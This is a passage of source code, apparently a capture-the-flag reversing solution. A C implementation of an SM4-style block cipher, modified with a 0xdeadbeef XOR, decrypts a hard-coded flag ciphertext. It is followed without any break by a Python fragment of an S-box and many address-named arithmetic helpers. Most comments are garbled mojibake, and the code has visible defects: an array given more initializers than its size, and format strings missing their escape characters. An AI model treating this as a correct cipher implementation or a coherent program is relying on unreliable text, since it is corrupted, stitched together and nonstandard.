        ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]];
    }
    four_uCh2uLong(ucSboxValueList, &ulTmp);
    ulTmp = ulTmp ^ move(ulTmp, 13) ^ move(ulTmp, 23);

    return ulTmp;
}

//锟接斤拷锟斤拷锟斤拷锟捷达拷锟斤拷锟斤拷锟斤拷,锟斤拷使锟斤拷Sbox锟斤拷锟叫凤拷锟斤拷锟皆变化锟斤拷锟劫斤拷锟斤拷锟斤拷锟皆变换L
u32 func_data(u32 input)
{
    int i = 0;
    u32 ulTmp = 0;
    u8 ucIndexList[4] = { 0 };
    u8 ucSboxValueList[4] = { 0 };
    printf("niinput: %xn",input);
    uLong2four_uCh(input, ucIndexList);
    for (i = 0; i < 4; i++)
    {
        ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]];
        
    }
    four_uCh2uLong(ucSboxValueList, &ulTmp);
    printf("nulTmp1: %xn",ulTmp);
    ulTmp = ulTmp ^ move(ulTmp, 2) ^ move(ulTmp, 10) ^ move(ulTmp, 18) ^ move(ulTmp, 24);
    printf("nulTmp2: %xn",ulTmp);
    return ulTmp;
}

//锟斤拷锟杰猴拷锟斤拷锟斤拷锟斤拷锟皆硷拷锟斤拷锟斤拷锟解长锟斤拷锟斤拷锟捷ｏ拷16锟街斤拷为一锟斤拷循锟斤拷锟斤拷锟斤拷锟姐部锟街诧拷0锟斤拷锟斤拷16锟街节碉拷锟斤拷锟斤拷锟斤拷锟斤拷
//len:
锟斤拷锟捷筹拷锟斤拷(锟斤拷锟解长锟斤拷锟斤拷锟斤拷) key:
锟斤拷钥锟斤拷16锟街节ｏ拷 input:
锟斤拷锟斤拷锟皆硷拷锟斤拷锟?output:
锟斤拷锟杰猴拷锟斤拷锟斤拷锟斤拷锟?
void encode_fun(u8 len,u8 *key, u8 *input, u8 *output)
{
    int i = 0,j=0; 
    u8 *p = (u8 *)malloc(50);      //锟斤拷锟斤拷一锟斤拷50锟街节伙拷锟斤拷锟斤拷
    u32 ulKeyTmpList[4] = { 0 };   //锟芥储锟斤拷钥锟斤拷u32锟斤拷锟斤拷
    u32 ulKeyList[36] = { 0 };     //锟斤拷锟斤拷锟斤拷钥锟斤拷展锟姐法锟斤拷系统锟斤拷锟斤拷FK锟斤拷锟斤拷锟侥斤拷锟斤拷娲?
    u32 ulDataList[36] = { 0 };    //锟斤拷锟节达拷偶锟斤拷锟斤拷锟斤拷锟?

    /***************************锟斤拷始锟斤拷锟斤拷锟斤拷锟斤拷钥********************************************/
    four_uCh2uLong(key, &(ulKeyTmpList[0]));
    four_uCh2uLong(key + 4, &(ulKeyTmpList[1]));
    four_uCh2uLong(key + 8, &(ulKeyTmpList[2]));
    four_uCh2uLong(key + 12, &(ulKeyTmpList[3]));

    for(i=0;i<4;i++)
    {
        printf("0x%x ",ulKeyTmpList[i]);
        
    }
    
    
    ulKeyList[0] = ulKeyTmpList[0] ^ TBL_SYS_PARAMS[0];
    ulKeyList[1] = ulKeyTmpList[1] ^ TBL_SYS_PARAMS[1];
    ulKeyList[2] = ulKeyTmpList[2] ^ TBL_SYS_PARAMS[2];
    ulKeyList[3] = ulKeyTmpList[3] ^ TBL_SYS_PARAMS[3];
    printf("n ulKeyList n");
    for (i = 0; i < 32; i++)             //32锟斤拷循锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷
    {
        //5-36为32锟斤拷锟斤拷锟斤拷钥
        ulKeyList[i + 4] = ulKeyList[i] ^ func_key(ulKeyList[i + 1] ^ ulKeyList[i + 2] ^ ulKeyList[i + 3] ^ TBL_FIX_PARAMS[i]);
        printf("%xn",ulKeyList[i + 4]);
    }
    
    /***********************************锟斤拷锟斤拷32锟斤拷32位锟斤拷锟斤拷锟斤拷钥锟斤拷锟斤拷**********************************/

    for (i = 0; i < len; i++)        //锟斤拷锟斤拷锟斤拷锟斤拷锟捷达拷锟斤拷锟絧锟斤拷锟斤拷锟斤拷
        *(p + i) = *(input + i);
    for (i = 0; i < 16-len % 16; i++)//锟斤拷锟斤拷锟斤拷16位锟斤拷0锟斤拷锟斤拷16锟斤拷锟斤拷锟斤拷锟斤拷
        *(p + len + i) = 0;
    
    for (j = 0; j < len / 16 + ((len % 16) ? 1:0); j++)  //锟斤拷锟斤拷循锟斤拷锟斤拷锟斤拷,锟斤拷锟斤拷锟斤拷锟杰猴拷锟斤拷锟捷憋拷锟芥（锟斤拷锟皆匡拷锟斤拷锟剿达拷锟斤拷锟斤拷16锟街斤拷为一锟轿硷拷锟杰ｏ拷锟斤拷锟斤拷循锟斤拷锟斤拷锟斤拷锟斤拷16锟街斤拷锟斤拷锟斤拷锟揭伙拷危锟?7锟街节诧拷0锟斤拷32锟街节猴拷锟斤拷屑锟斤拷锟斤拷锟斤拷危锟斤拷源锟斤拷锟斤拷疲锟?
    {
        
        /*锟斤拷始锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷*/
        four_uCh2uLong(p + 16 * j, &(ulDataList[0]));
        four_uCh2uLong(p + 16 * j + 4, &(ulDataList[1]));
        four_uCh2uLong(p + 16 * j + 8, &(ulDataList[2]));
        four_uCh2uLong(p + 16 * j + 12, &(ulDataList[3]));
        printf("n input data n");
        for(i=0;i<4;i++)
        {
        printf("0x%x ",ulDataList[i]);
        
        }    
        printf("n"); 
        printf("n ulDataList n");
        //锟斤拷锟斤拷
        for (i = 0; i < 32; i++)
        {
            printf("n  0x%x 0x%x 0x%x 0x%x  n",ulDataList[i + 1] ,ulDataList[i + 2] , ulDataList[i + 3] , ulKeyList[i + 4]);
            ulDataList[i + 4] = ulDataList[i] ^ func_data(ulDataList[i + 1] ^ ulDataList[i + 2] ^ ulDataList[i + 3] ^ ulKeyList[i + 4]);
            printf("result:  %xn",ulDataList[i + 4] );
            ulDataList[i + 4] ^= 0xdeadbeef;
            printf("xor result:  %xn",ulDataList[i + 4] );
        }
        /*锟斤拷锟斤拷锟杰猴拷锟斤拷锟斤拷锟斤拷锟?/
        uLong2four_uCh(ulDataList[35], output + 16 * j);
        uLong2four_uCh(ulDataList[34], output + 16 * j + 4);
        uLong2four_uCh(ulDataList[33], output + 16 * j + 8);
        uLong2four_uCh(ulDataList[32], output + 16 * j + 12);
        printf("n"); 
 
        
    }
    free(p);
}

//锟斤拷锟杰猴拷锟斤拷锟斤拷锟斤拷锟斤拷芎锟斤拷锟斤拷锟斤拷锟揭伙拷拢锟街伙拷锟斤拷锟皆渴癸拷玫锟剿筹拷锟酵拷锟斤拷锟斤拷锟皆匡拷追锟斤拷锟斤拷镁锟斤拷墙锟斤拷埽锟?
//len:
锟斤拷锟捷筹拷锟斤拷 key:
锟斤拷钥 input:
锟斤拷锟斤拷募锟斤拷芎锟斤拷锟斤拷锟?output:
锟斤拷锟斤拷慕锟斤拷芎锟斤拷锟斤拷锟?
void decode_fun(u8 len,u8 *key, u8 *input, u8 *output)
{
    int i = 0,j=0;
    u32 ulKeyTmpList[4] = { 0 };//锟芥储锟斤拷钥锟斤拷u32锟斤拷锟斤拷
    u32 ulKeyList[36] = { 0 };  //锟斤拷锟斤拷锟斤拷钥锟斤拷展锟姐法锟斤拷系统锟斤拷锟斤拷FK锟斤拷锟斤拷锟侥斤拷锟斤拷娲?
    u32 ulDataList[36] = { 0 }; //锟斤拷锟节达拷偶锟斤拷锟斤拷锟斤拷锟?

    /*锟斤拷始锟斤拷锟斤拷锟斤拷锟斤拷钥*/
    four_uCh2uLong(key, &(ulKeyTmpList[0]));
    four_uCh2uLong(key + 4, &(ulKeyTmpList[1]));
    four_uCh2uLong(key + 8, &(ulKeyTmpList[2]));
    four_uCh2uLong(key + 12, &(ulKeyTmpList[3]));
    
    ulKeyList[0] = ulKeyTmpList[0] ^ TBL_SYS_PARAMS[0];
    ulKeyList[1] = ulKeyTmpList[1] ^ TBL_SYS_PARAMS[1];
    ulKeyList[2] = ulKeyTmpList[2] ^ TBL_SYS_PARAMS[2];
    ulKeyList[3] = ulKeyTmpList[3] ^ TBL_SYS_PARAMS[3];

    for (i = 0; i < 32; i++)             //32锟斤拷循锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷
    {
        //ulDataList[i + 4] ^= 0xdeadbeef;
        //5-36为32锟斤拷锟斤拷锟斤拷钥
        
        ulKeyList[i + 4] = ulKeyList[i] ^ func_key(ulKeyList[i + 1] ^ ulKeyList[i + 2] ^ ulKeyList[i + 3] ^ TBL_FIX_PARAMS[i]);
    
    }
    /*锟斤拷锟斤拷32锟斤拷32位锟斤拷锟斤拷锟斤拷钥锟斤拷锟斤拷*/

    for (j = 0; j < len / 16; j++)  //锟斤拷锟斤拷循锟斤拷锟斤拷锟斤拷,锟斤拷锟斤拷锟斤拷锟杰猴拷锟斤拷锟捷憋拷锟斤拷
    {
        /*锟斤拷始锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷*/
        four_uCh2uLong(input + 16 * j, &(ulDataList[0]));
        four_uCh2uLong(input + 16 * j + 4, &(ulDataList[1]));
        four_uCh2uLong(input + 16 * j + 8, &(ulDataList[2]));
        four_uCh2uLong(input + 16 * j + 12, &(ulDataList[3]));

        //锟斤拷锟斤拷
        for (i = 0; i < 32; i++)
        {
            ulDataList[i + 4] = ulDataList[i] ^ func_data(ulDataList[i + 1] ^ ulDataList[i + 2] ^ ulDataList[i + 3] ^ ulKeyList[35 - i])^ 0xdeadbeef;//锟斤拷锟斤拷锟轿ㄒ伙拷锟酵拷木锟斤拷锟斤拷锟斤拷锟皆匡拷锟绞癸拷锟剿筹拷锟?
        }
        /*锟斤拷锟斤拷锟杰猴拷锟斤拷锟斤拷锟斤拷锟?/
        uLong2four_uCh(ulDataList[35], output + 16 * j);
        uLong2four_uCh(ulDataList[34], output + 16 * j + 4);
        uLong2four_uCh(ulDataList[33], output + 16 * j + 8);
        uLong2four_uCh(ulDataList[32], output + 16 * j + 12);
    }
}

//锟睫凤拷锟斤拷锟街凤拷锟斤拷锟斤拷转16锟斤拷锟狡达拷印
void print_hex(u8 *data, int len)
{
    int i = 0;
    char alTmp[16] = { '0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f' };
    for (i = 0; i < len; i++)
    {
        printf("%c", alTmp[data[i] / 16]);
        printf("%c", alTmp[data[i] % 16]);
        putchar(' ');
    }
    putchar('n');
}
/*锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷实锟斤拷锟斤拷锟斤拷锟街节硷拷锟斤拷锟斤拷锟斤拷埽锟斤拷锟斤拷医锟斤拷锟斤拷确*/
int main(void)
{
    u8 i,len;
    u8 encode_Result[50] = { 0 };    //锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷
    u8 decode_Result[50] = { 0 };    //锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷
    u8 key[16] = "somethingverybad";       //锟斤拷锟斤拷16锟街节碉拷锟斤拷钥
    u8 iv[16] = "somethingnotgood";
    u8 Data_plain[16] = { 0x62,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,};//锟斤拷锟斤拷16锟街节碉拷原始锟斤拷锟斤拷锟斤拷锟捷ｏ拷锟斤拷锟斤拷锟矫ｏ拷
    len = 16 * (sizeof(Data_plain) / 16) + 16 * ((sizeof(Data_plain) % 16) ? 1 : 0);
    /*
    for(i =0 ;i<16;i++)
    {
        Data_plain[i]^=iv[i];
    }
    encode_fun(sizeof(Data_plain),key, Data_plain, encode_Result);
    for( i=0;i<16;i++)
    {
        printf("0x%x ",encode_Result[i]);
    }
    
    
    decode_fun(len,key, encode_Result, decode_Result);     
    
    printf("decrypt:n");
    printf("key %sn",key); 
    for (i = 0; i < len; i++)
        printf("%x ", (*(decode_Result + i))^=iv[i]);
    */
    u8 ccc1[32] = {  0xF0, 0xA8, 0xBC, 0x50, 0xD9, 0x3A, 0xF7, 0xCE, 0x49, 0x28, 
  0xEA, 0x77, 0x33, 0xB4, 0x17, 0xB0, 0x8E, 0xB9, 0xA5, 0xAD, 
  0xD2, 0x72, 0xDE, 0x2F, 0x46, 0x72, 0xF2, 0x4C, 0x6D, 0x41, 
  0x34, 0x38};
    u8 ccc[32] = {  0xF0, 0xA8, 0xBC, 0x50, 0xD9, 0x3A, 0xF7, 0xCE, 0x49, 0x28, 
  0xEA, 0x77, 0x33, 0xB4, 0x17, 0xB0, 0x8E, 0xB9, 0xA5, 0xAD, 
  0xD2, 0x72, 0xDE, 0x2F, 0x46, 0x72, 0xF2, 0x4C, 0x6D, 0x41, 
  0x34, 0x38};
   u8 flag[32];
   
   decode_fun(16,key, ccc, flag);
   for (i = 0; i < 16; i++)
        printf("%c", (*(flag+ i))^=iv[i]);
    decode_fun(16,key, &ccc[16], &flag[16]);
    for (i = 0; i < 16; i++)
        printf("%c", (*(flag+ i+16))^=ccc[i]);
    return 0;
}
cin = 'a'*32
print(cin)
ii,jj = 0,0
tt =0 
sbox=[0xd4,0x72,0xab,0x2a,0x46,0x5f,0xf8,0xc3,0x96,0xd6,0x32,0xd7,0x3d,0x69,0xd9,0x64,0xe1,0x65,0x41,0x24,0x3,0xd8,0x5c,0xec,0x7c,0x73,0xc4,0x43,0x8d,0x26,0x68,0xdc,0x3f,0x2c,0xe5,0x39,0x6b,0x4d,0x21,0xf4,0x4e,0x85,0xdd,0x13,0x8e,0xb4,0x3a,0x11,0xd0,0xf9,0xf3,0x9e,0xd1,0x5d,0x37,0x61,0x95,0xea,0x5b,0x99,0x9c,0xb3,0x7,0x2e,0x4,0xf,0x89,0x57,0x5a,0xa7,0x4f,0x82,0x76,0xa0,0xe6,0x63,0xf1,0x15,0x3e,0x1b,0xfd,0xc7,0xa8,0x31,0x6a,0xc6,0x8b,0xd5,0x59,0x6d,0xe9,0x87,0x74,0x5,0x1e,0xb1,0x97,0xa,0xce,0x52,0xb9,0x8f,0xe7,0xac,0x8,0xa6,0x16,0xc2,0xf2,0x42,0x9a,0xfa,0xe2,0x86,0x53,0xff,0x55,0x23,0x71,0xb6,0x44,0xbd,0x8a,0xb2,0x28,0x54,0xc8,0xf0,0x7a,0x90,0xa4,0x7d,0xd3,0xdb,0x1a,0x22,0x20,0xb5,0x83,0xb0,0xa1,0xa5,0x84,0xb7,0x6,0x70,0xaa,0xbc,0xda,0x4b,0x34,0x67,0xd2,0x60,0x0,0xc5,0xd,0x56,0xa3,0x98,0x2d,0x7f,0x1d,0x3b,0xaf,0xe3,0x7b,0x93,0x7e,0x6f,0x6c,0xa9,0x36,0xde,0xbe,0xc9,0x2,0x48,0x8c,0xe8,0xfe,0x62,0x3c,0xca,0x33,0xfc,0xdf,0xee,0x40,0xf5,0xcb,0x47,0x79,0xb,0x2b,0x29,0x94,0xcd,0xba,0x51,0xae,0x58,0x12,0x14,0x88,0xeb,0x9b,0x77,0x1c,0x27,0xe0,0x4c,0x38,0x91,0x49,0xcc,0xa2,0xc1,0x25,0xcf,0xf7,0x9d,0x2f,0xc0,0x45,0x17,0x35,0x92,0x9f,0x4a,0x78,0x66,0xf6,0x5e,0xfb,0xbb,0x10,0x81,0x1,0xe,0x6e,0x9,0xb8,0x18,0x50,0xad,0xe4,0x30,0x80,0x75,0xef,0xed,0x19,0xbf,0xc,0x1f]

def  a224(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a264(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  a2b0(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a2f0(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  a33c(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a370(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  a3bc(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  a3fc(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  a43c(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  a47c(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a4b0(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a4e4(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a524(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a564(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  a5a4(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a5d8(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a618(a1, a2, a3):
  return (a1 + a3 + a2)
def  a64c(a1, a2, a3):
  return (a1 + a3 + a2)
def  a680(a1, a2, a3, a4, a5):
  return (a1 ^ a3 ^ (a4 + a5)) + a2
def  a6cc(a1, a2, a3):
  return (a1 + a3 + a2)
def  a700(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  a74c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a78c(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a7c0(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a7f4(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  a840(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a874(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a8b4(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  a900(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a940(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  a980(a1, a2, a3):
  return (a1 + a3 + a2)
def  a9b4(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a9e8(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  aa1c(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  aa50(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  aa9c(a1, a2, a3):
  return (a1 + a3 + a2)
def  aad0(a1, a2, a3):
  return (a1 + a3 + a2)
def  ab04(a1, a2, a3):
  return (a1 + a3 + a2)
def  ab38(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  ab84(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  abc4(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  ac10(a1, a2, a3, a4,  a5):
  return (a1 ^ a3 ^ a4 ^ a5) + a2
def  ac5c(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  aca8(a1, a2, a3):
  return (a1 + a3 + a2)
def  acdc(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  ad1c(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  ad50(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  ad90(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  add0(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  ae10(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  ae5c(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  ae9c(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  aedc(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  af28(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  af68(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  afa8(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  afe8(a1, a2, a3):
  return (a1 + a3 + a2)
def  b01c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b05c(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  b0a8(a1, a2, a3):
  return (a1 + a3 + a2)
def  b0dc(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  b11c(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  b168(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b1a8(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b1e8(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  b234(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  b274(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  b2c0(a1, a2, a3):
  return (a1 + a3 + a2)
def  b2f4(a1, a2, a3):
  return (a1 + a3 + a2)
def  b328(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  b35c(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  b3a8(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  b3f4(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b434(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  b480(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b4c0(a1, a2, a3, a4,  a5):
  return ((a1 + a3) ^ a4 ^ a5) + a2
def  b50c(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  b54c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b58c(a1, a2, a3):
  return (a1 + a3 + a2)
def  b5c0(a1, a2, a3):
  return (a1 + a3 + a2)
def  b5f4(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  b634(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b674(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  b6c0(a1, a2, a3, a4,  a5):
  return ((a1 + a3) ^ a4 ^ a5) + a2
def  b70c(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  b758(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  b798(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  b7e4(a1, a2, a3, a4,  a5):
  return (a1 ^ a3 ^ a4 ^ a5) + a2
def  b830(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  b870(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  b8b0(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b8f0(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  b93c(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  b970(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  b9bc(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  b9fc(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  ba48(a1, a2, a3):
  return (a1 + a3 + a2)
def  ba7c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  babc(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  bafc(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  bb30(a1, a2, a3):
  return (a1 + a3 + a2)
def  bb64(a1, a2, a3):
  return (a1 + a3 + a2)
def  bb98(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  bbe4(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  bc18(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  bc64(a1, a2, a3, a4,  a5):
  return ((a1 + a3) ^ a4 ^ a5) + a2
def  bcb0(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  bcf0(a1, a2, a3):
  return (a1 + a3 + a2)
def  bd24(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  bd64(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  bdb0(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  bdfc(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  be30(a1, a2, a3):
  return (a1 + a3 + a2)
def  be64(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  bea4(a1, a2, a3):
  return (a1 + a3 + a2)
def  bed8(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  bf0c(a1, a2, a3):
  return (a1 + a3 + a2)
def  bf40(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  bf74(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  bfb4(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  bff4(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  c034(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  c074(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  c0b4(a1, a2, a3):
  return (a1 + a3 + a2)
def  c0e8(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  c134(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  c174(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  c1b4(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  c1f4(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  c240(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  c274(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  c2c0(a1, a2, a3):
  return (a1 + a3 + a2)
def  c2f4(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  c340(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  c380(a1, a2, a3, a4, a5):
  return (a1 ^ a3 ^ (a4 + a5)) + a2
def  c3cc(a1, a2, a3):
  return (a1 + a3 + a2)
def  c400(a1, a2, a3, a4, a5):
  return (a1 ^ a3 ^ (a4 + a5)) + a2
def  c44c(a1, a2, a3, a4,  a5):
  return (a1 ^ (a3 + a4) ^ a5) + a2
def  c498(a1, a2, a3):
  return (a1 + a3 + a2)
def  c4cc(a1, a2, a3):
  return (a1 + a3 + a2)
def  c500(a1, a2, a3, a4, a5):
  return (a1 ^ a3 ^ (a4 + a5)) + a2
def  c54c(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  c598(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  c5d8(a1, a2, a3):
  return (a1 + a3 + a2)
def  c60c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  c64c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  c68c(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  c6d8(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  c70c(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  c74c(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  c780(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  c7b4(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  c7f4(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  c840(a1, a2, a3, a4, a5):
  return ((a1 + a3) ^ (a4 + a5)) + a2
def  c88c(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  c8d8(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  c924(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  c958(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  c9a4(a1, a2, a3):
  return (a1 + a3 + a2)
def  c9d8(a1, a2, a3):
  return (a1 + a3 + a2)
def  ca0c(a1, a2, a3):
  return (a1 + a3 + a2)
def  ca40(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  ca80(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  cac0(a1, a2, a3):
  return (a1 + a3 + a2)
def  caf4(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  cb28(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  cb5c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  cb9c(a1, a2, a3):
  return (a1 + a3 + a2)
def  cbd0(a1, a2, a3):
  return (a1 + a3 + a2)
def  cc04(a1, a2, a3):
  return (a1 + a3 + a2)
def  cc38(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  cc78(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  ccb8(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  ccec(a1, a2, a3):
  return (a1 + a3 + a2)
def  cd20(a1, a2, a3, a4, a5):
  return (a1 ^ a3 ^ (a4 + a5)) + a2
def  cd6c(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  cda0(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  cdec(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  ce2c(a1, a2, a3):
  return (a1 + a3 + a2)
def  ce60(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  ceac(a1, a2, a3):
  return (a1 + a3 + a2)
def  cee0(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  cf20(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  cf60(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  cfa0(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
